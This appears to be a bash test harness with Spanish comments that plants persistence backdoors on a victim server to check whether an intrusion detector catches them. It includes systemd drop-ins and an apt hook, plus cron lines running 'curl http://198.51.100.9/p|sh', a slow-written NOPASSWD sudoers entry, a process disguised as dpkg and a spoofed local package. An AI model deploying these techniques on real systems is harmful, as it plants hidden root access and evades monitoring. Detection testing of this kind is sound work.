#!/usr/bin/env bash
# Pista Q · Campaña F5 para los pilotos: valida en un VPS real lo nuevo de v0.0.9 (B77 integridad
# semántica + autoría, B78 pkgdb, B79 veredictos) y que las evasiones encontradas siguen cerradas.
#
# SOLO DISEÑO + SCRIPT: arx-98 decide cuándo y en qué VPS se ejecuta, cada escenario dentro de su
# ventana del medidor. Se corre en el VPS VÍCTIMA como root (el atacante ya tiene root y busca
# persistencia oculta); algunos escenarios necesitan red saliente (apt) — arx-98 los encuadra.
#
# Cada escenario deja una PISTA de verificación (qué grep en incidents.jsonl). Criterio general:
# DETECTADO ≤ 30 s, con autoría (quién lo escribió) y, donde aplica, semántica correcta.
#
#   bash f5-campaign.sh <escenario>      escenarios abajo. 'limpiar' revierte todo.
set -uo pipefail
INC=/var/lib/arx/incidents.jsonl
seen() { grep -nE "$1" "$INC" 2>/dev/null | tail -3; }
note() { echo "  PISTA: $*"; }

case "${1:-}" in

# ── R2 catálogo, ahora que B77 cierra los huecos de rc2 ───────────────────────
dropin)   # drop-in ExecStartPre en servicio ajeno (rc2 lo EVADÍA; B77 debe verlo, high, con autoría)
  mkdir -p /etc/systemd/system/ssh.service.d
  cat > /etc/systemd/system/ssh.service.d/99-f5.conf <<EOF
[Service]
ExecStartPre=/usr/bin/curl -s http://198.51.100.9/p.sh
EOF
  systemctl daemon-reload
  note "seen 'ssh.service.d/99-f5|what systemd runs changed'  (high, con 'by <exe>')" ;;

socketpathtimer)   # .socket/.path/.timer nuevos (rc2 los EVADÍA)
  cat > /etc/systemd/system/f5-beacon.socket <<EOF
[Socket]
ListenStream=4444
EOF
  cat > /etc/systemd/system/f5-watch.path <<EOF
[Path]
PathChanged=/tmp/f5trigger
EOF
  cat > /etc/systemd/system/f5-beacon.timer <<EOF
[Timer]
OnUnitInactiveSec=5min
[Install]
WantedBy=timers.target
EOF
  systemctl daemon-reload
  note "seen 'f5-beacon.socket|f5-watch.path|f5-beacon.timer'  (los 3, high)" ;;

hook)   # apt.conf hook escondido entre /* */ en comillas (HZ#1, ya arreglado: debe salir crit)
  cat > /etc/apt/apt.conf.d/99-f5-hook <<'EOF'
X::Open "ruido /*";
DPkg::Post-Invoke {"curl -s http://198.51.100.9/p|sh";};
X::Close "*/ ruido";
EOF
  note "seen 'apt.conf.d/99-f5-hook|runs commands'  (crit — el /* */ NO debe esconderlo)" ;;

# ── evasiones del enunciado F5 ────────────────────────────────────────────────
lenta)   # escritura lenta: un sudoers.d NOPASSWD byte a byte durante ~2 min
  : > /etc/sudoers.d/zz-f5-lenta
  ( for c in $(echo 'nobody ALL=(ALL) NOPASSWD: ALL' | sed 's/./& /g'); do
      printf '%s' "$c" >> /etc/sudoers.d/zz-f5-lenta; sleep 4; done; echo >> /etc/sudoers.d/zz-f5-lenta ) &
  note "la escritura es lenta pero el barrido compara estado: seen 'sudoers.d/zz-f5-lenta|grants something new' (crit al cerrarse una línea válida)" ;;

nombrefalso)   # nombre falso: un proceso llamado «dpkg» (exe real en /tmp) escribe un cron.d
  cp /bin/bash /tmp/dpkg
  /tmp/dpkg -c 'echo "* * * * * root /usr/bin/curl -s http://198.51.100.9/p|sh" > /etc/cron.d/zz-f5-fake'
  note "exe=/tmp/dpkg, no /usr/bin/dpkg: NO debe rebajar. seen 'cron.d/zz-f5-fake|new scheduled command' (high, autoría /tmp/dpkg)" ;;

durante-update)   # cambio durante una actualización APT real: autoría mezclada, no se adopta
  echo "  lanzando apt-get update/upgrade real y, a la vez, plantando un drop-in malicioso…"
  ( apt-get -o DPkg::Lock::Timeout=120 update -qq && apt-get -o DPkg::Lock::Timeout=120 -y upgrade -qq ) >/tmp/f5-apt.log 2>&1 &
  sleep 3
  mkdir -p /etc/systemd/system/cron.service.d
  cat > /etc/systemd/system/cron.service.d/99-f5-race.conf <<EOF
[Service]
ExecStartPre=/usr/bin/curl -s http://198.51.100.9/p.sh
EOF
  systemctl daemon-reload
  note "el drop-in NO lo escribió dpkg: autoría mezclada→no se adopta. seen 'cron.service.d/99-f5-race|what systemd runs changed' (high)" ;;

deb-local)   # .deb LOCAL con nombre de un paquete de repo (HZ#7, ya arreglado: NO debe rebajarse)
  P=/tmp/f5deb; rm -rf "$P"; mkdir -p "$P/DEBIAN" "$P/etc/cron.d"
  PKG=$(apt-cache --no-generate pkgnames 2>/dev/null | grep -m1 '^curl$' || echo curl)
  cat > "$P/DEBIAN/control" <<EOF
Package: $PKG
Version: 999.0
Architecture: all
Maintainer: f5 <f5@example.invalid>
Description: f5 local deb con nombre de repo
EOF
  echo '* * * * * root /usr/bin/curl -s http://198.51.100.9/p|sh' > "$P/etc/cron.d/zz-f5-deb"
  dpkg-deb --build "$P" /tmp/f5-$PKG.deb >/dev/null 2>&1
  dpkg -i /tmp/f5-$PKG.deb >/dev/null 2>&1
  note "instalado con dpkg auténtico pero versión LOCAL: signed_origin(installed_only) debe dar no-firmado. seen 'cron.d/zz-f5-deb' (DETECTADO, NO adoptado por paquete)" ;;

# ── limpieza ──────────────────────────────────────────────────────────────────
limpiar)
  rm -f /etc/systemd/system/ssh.service.d/99-f5.conf /etc/systemd/system/cron.service.d/99-f5-race.conf \
        /etc/systemd/system/f5-beacon.socket /etc/systemd/system/f5-watch.path /etc/systemd/system/f5-beacon.timer \
        /etc/apt/apt.conf.d/99-f5-hook /etc/sudoers.d/zz-f5-lenta /etc/cron.d/zz-f5-fake /etc/cron.d/zz-f5-deb \
        /tmp/dpkg /tmp/f5trigger
  rmdir /etc/systemd/system/ssh.service.d /etc/systemd/system/cron.service.d 2>/dev/null
  PKG=$(apt-cache --no-generate pkgnames 2>/dev/null | grep -m1 '^curl$' || echo curl)
  dpkg -r "$PKG" >/dev/null 2>&1 || true   # OJO: arx-98 revisa si conviene reinstalar el paquete real
  systemctl daemon-reload
  echo "  limpiado (revisa que el paquete '$PKG' quede en su versión de repo si se tocó)" ;;

*)
  cat >&2 <<USAGE
Campaña F5 (diseño). Escenarios:
  dropin             drop-in ExecStartPre (hueco de rc2, B77 debe verlo)
  socketpathtimer    .socket/.path/.timer nuevos (huecos de rc2)
  hook               apt.conf hook escondido entre /* */ (HZ#1)
  lenta              escritura lenta de un sudoers NOPASSWD
  nombrefalso        proceso llamado «dpkg» con exe en /tmp (no debe rebajar)
  durante-update     drop-in malicioso durante un apt upgrade real (autoría mezclada)
  deb-local          .deb local con nombre de repo (HZ#7, no debe rebajarse)
  limpiar            revierte todo
Cada uno dentro de su ventana del medidor; arx-98 decide VPS y orden.
USAGE
  exit 2 ;;
esac
